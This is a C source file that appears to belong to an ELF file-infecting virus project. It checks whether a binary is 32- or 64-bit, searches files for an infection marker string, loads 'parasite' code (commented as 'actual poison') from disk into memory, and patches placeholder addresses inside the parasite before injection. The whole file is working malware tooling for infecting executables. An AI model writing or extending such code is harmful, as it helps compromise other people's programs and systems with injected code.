#include "vil.h"

int		is_32or64ELF(void *ptr)
{
	Elf32_Ehdr	*ehdr		= (Elf32_Ehdr *) ptr;

	if (ehdr->e_ident[EI_CLASS] == ELFCLASS32)
	{
		if (visual)
			fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 32bits\n"RESET);
		return (1);
	}
	if (ehdr->e_ident[EI_CLASS] == ELFCLASS64)
	{
		if (visual)
			fprintf(stdout, BOLDRED"<"CYAN"o"RED">"RESET YELLOW" 64bits\n"RESET);
		return (2);
	}
	return (0);
}

int		check_copy(char *ptr, size_t size)
{
	for (int i = 0; i < size; ++i)
	{
		if (message[0] == ptr[i])
		{
			int j = 0;
			int ms = strlen(message);
			while (i < size && j < ms)
			{
				if (message[j] != ptr[i])
					break;
				++j;
				++i;
			}
			if (j == ms)
				return (1);
		}
	}
	return (0);
}

// Loads parasite code into memory and defines parasite_code and parasite_size variables
void	ParasiteLoader(char *parasite_path)
{
	// Open parasite code
	int parasite_fd = open(parasite_path, O_RDONLY);
	if (parasite_fd == -1)
	{
		perror(RED"ParasiteLoader - open():"RESET);
		exit(0x60);
	}

	// Get the parasite_size using lstat() syscall
	struct stat buf;
	if (lstat(parasite_path, &buf) != 0)
	{
		perror(RED"ParasiteLoader - lstat():"RESET);
		exit(0x61);
	}

	// Initializing parasite_size and allocating space for parasite_code
	parasite_size = buf.st_size;
	parasite_full_size = parasite_size + encr_bundle_size;
	if (!(parasite_code = (int8_t *)malloc(parasite_size)))
	{
		perror(RED"ParasiteLoader, malloc"RESET);
		exit(0x61);
	}

	// Load actual poison @ parasite_code (allocated memory on heap)
	int bytes_read = read(parasite_fd, parasite_code, parasite_size);
	if (bytes_read == -1)
	{
		perror(RED"ParasiteLoader - read():");
		exit(0x62);
	}

	close(parasite_fd);
}

int			error(char *whut)
{
	if (visual)
		dprintf(2, "%s", whut);
	return (1);
}

void		AddrPatcher(u_int8_t *parasite, long placeholder, long address)
{
	u_int8_t *ptr = parasite;
	int i;
	for (i = 0 ; i < parasite_size ; ++i)
	{
		long potential_placeholder = *((long *)(ptr + i));

		if (!(placeholder ^ potential_placeholder))
		{
			*((long *)(ptr + i)) = address;
			return;
		}
	}
}
